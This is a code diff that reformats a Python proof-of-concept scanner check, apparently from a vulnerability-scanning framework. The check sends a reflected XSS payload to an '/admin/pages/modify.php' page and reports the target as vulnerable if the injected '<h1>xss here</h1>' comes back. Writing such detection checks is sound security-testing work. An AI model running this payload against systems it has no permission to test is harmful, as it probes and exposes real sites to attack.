@@ -41,9 +41,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -52,7 +53,7 @@ class Poc(ABPoc):
             payload = '/admin/pages/modify.php?page_id=1%22><h1>xss%20here</h1><!--'
             url += payload
             code, head, res, errcode, final_url = hh.http(url)
-            #print "[*]Request URL: " + url
+            # print "[*]Request URL: " + url
             if code == 200 and re.search("<h1>xss here</h1>", res):
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
